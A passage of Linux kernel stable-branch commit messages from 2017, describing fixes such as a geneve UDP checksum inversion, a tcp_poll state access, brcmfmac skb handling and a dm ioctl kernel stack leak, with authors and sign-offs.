Creating a geneve link with 'udpcsum' set results in a creation of link
for which UDP checksum will NOT be computed on outbound packets, as can
be seen below.
11: gen0:  mtu 1500 qdisc noop state DOWN
link/ether c2:85:27:b6:b4:15 brd ff:ff:ff:ff:ff:ff promiscuity 0
geneve id 200 remote 192.168.13.1 dstport 6081 noudpcsum
Similarly, creating a link with 'noudpcsum' set results in a creation
of link for which UDP checksum will be computed on outbound packets.
Fixes: 9b4437a5b870 ("geneve: Unify LWT and netdev handling.")
Signed-off-by: Girish Moodalbail
Acked-by: Pravin B Shelar
Acked-by: Lance Richardson
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 011fbfb296e4cfcd5769fb3f84ae2f263b1faac1
Author: Davide Caratti
Date: Wed Apr 26 19:07:35 2017 +0200
tcp: fix access to sk->sk\_state in tcp\_poll()
[ Upstream commit d68be71ea14d609a5f31534003319be5db422595 ]
avoid direct access to sk->sk\_state when tcp\_poll() is called on a socket
using active TCP fastopen with deferred connect. Use local variable
'state', which stores the result of sk\_state\_load(), like it was done in
commit 00fd38d938db ("tcp: ensure proper barriers in lockless contexts").
Fixes: 19f6d3f3c842 ("net/tcp-fastopen: Add new API support")
Signed-off-by: Davide Caratti
Acked-by: Wei Wang
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit c0e5b847c77e2b8265a5abe7f7642526f08cd51a
Author: Alexandre Belloni
Date: Wed Apr 26 12:06:28 2017 +0200
net: macb: fix phy interrupt parsing
[ Upstream commit ae3696c167cc04d32634c4af82f43b446c5176b0 ]
Since 83a77e9ec415, the phydev irq is explicitly set to PHY\_POLL when
there is no pdata. It doesn't work on DT enabled platforms because the
phydev irq is already set by libphy before.
Fixes: 83a77e9ec415 ("net: macb: Added PCI wrapper for Platform Driver.")
Signed-off-by: Alexandre Belloni
Acked-by: Nicolas Ferre
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit acc7c954b035b53c58714ce951354becaddfd5b8
Author: Greg Kroah-Hartman
Date: Thu May 4 15:51:03 2017 -0700
refcount: change EXPORT\_SYMBOL markings
commit d557d1b58b3546bab2c5bc2d624c5709840e6b10 upstream.
Now that kref is using the refcount apis, the \_GPL markings are getting
exported to places that it previously wasn't. Now kref.h is GPLv2
licensed, so any non-GPL code using it better be talking to some
lawyers, but changing api markings isn't considered "nice", so let's fix
this up.
Cc: Philip Müller
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Linus Torvalds
commit e2b8851f1fdfe1d038fa9a03497d257f7a8ffb63
Author: Dave Aldridge
Date: Tue May 9 02:57:35 2017 -0600
sparc64: fix fault handling in NGbzero.S and GENbzero.S
commit 3c7f62212018b904ae17f5636ead18a4dca3a88f upstream.
When any of the functions contained in NGbzero.S and GENbzero.S
vector through \*bzero\_from\_clear\_user, we may end up taking a
fault when executing one of the store alternate address space
instructions. If this happens, the exception handler does not
restore the %asi register.
This commit fixes the issue by introducing a new exception
handler that ensures the %asi register is restored when
a fault is handled.
Orabug: 25577560
Signed-off-by: Dave Aldridge
Reviewed-by: Rob Gardner
Reviewed-by: Babu Moger
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit c98f47c1f645774e02e04e94111c98b97462ee98
Author: James Hughes
Date: Tue Apr 25 10:15:06 2017 +0100
brcmfmac: Make skb header writable before use
commit 9cc4b7cb86cbcc6330a3faa8cd65268cd2d3c227 upstream.
The driver was making changes to the skb\_header without
ensuring it was writable (i.e. uncloned).
This patch also removes some boiler plate header size
checking/adjustment code as that is also handled by the
skb\_cow\_header function used to make header writable.
Signed-off-by: James Hughes
Acked-by: Arend van Spriel
Signed-off-by: Kalle Valo
Signed-off-by: Arend van Spriel
Signed-off-by: Greg Kroah-Hartman
commit 7f073b7e4d63afdcf3abc91f8d9c11ab9317ed0b
Author: James Hughes
Date: Mon Apr 24 12:40:50 2017 +0100
brcmfmac: Ensure pointer correctly set if skb data location changes
commit 455a1eb4654c24560eb9dfc634f29cba3d87601e upstream.
The incoming skb header may be resized if header space is
insufficient, which might change the data adddress in the skb.
Ensure that a cached pointer to that data is correctly set by
moving assignment to after any possible changes.
Signed-off-by: James Hughes
Acked-by: Arend van Spriel
Signed-off-by: Kalle Valo
Signed-off-by: Arend van Spriel
Signed-off-by: Greg Kroah-Hartman
commit b998524b6c6082805dded8b03c826233f66241bd
Author: Giedrius Statkevičius
Date: Sat Mar 25 18:00:49 2017 +0200
power: supply: lp8788: prevent out of bounds array access
commit bdd9968d35f7fcdb76089347d1529bf079534214 upstream.
val might become 7 in which case stime[7] (array of length 7) would be
accessed during the scnprintf call later and that will cause issues.
Obviously, string concatenation is not intended here so just a comma needs
to be added to fix the issue.
Fixes: 98a276649358 ("power\_supply: Add new lp8788 charger driver")
Signed-off-by: Giedrius Statkevičius
Acked-by: Milo Kim
Signed-off-by: Sebastian Reichel
Signed-off-by: Greg Kroah-Hartman
commit 648ada88cba2e78171d8ee81f4fceffc0386f6aa
Author: Vincent Abriou
Date: Thu Mar 23 15:44:52 2017 +0100
drm/sti: fix GDP size to support up to UHD resolution
commit 2f410f88c0a1c7e19762918d2614f506a7b63a82 upstream.
On stih407-410 chip family the GDP layers are able to support up to UHD
resolution (3840 x 2160).
Signed-off-by: Vincent Abriou
Acked-by: Lee Jones
Tested-by: Lee Jones
Link: http://patchwork.freedesktop.org/patch/msgid/1490280292-30466-1-git-send-email-vincent.abriou@st.com
Signed-off-by: Greg Kroah-Hartman
commit 40a1937317e26d05c815096e1151df6600b7b525
Author: Adrian Salido
Date: Thu Apr 27 10:32:55 2017 -0700
dm ioctl: prevent stack leak in dm ioctl call
commit 4617f564c06117c7d1b611be49521a4430042287 upstream.
When calling a dm ioctl that doesn't process any data
(IOCTL\_FLAGS\_NO\_PARAMS), the contents of the data field in struct
dm\_ioctl are left initialized. Current code is incorrectly extending
the size of data copied back to user, causing the contents of kernel
stack to be leaked to user. Fix by only copying contents before data
and allow the functions processing the ioctl to override.
Signed-off-by: Adrian Salido
Reviewed-by: Alasdair G Kergon
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman

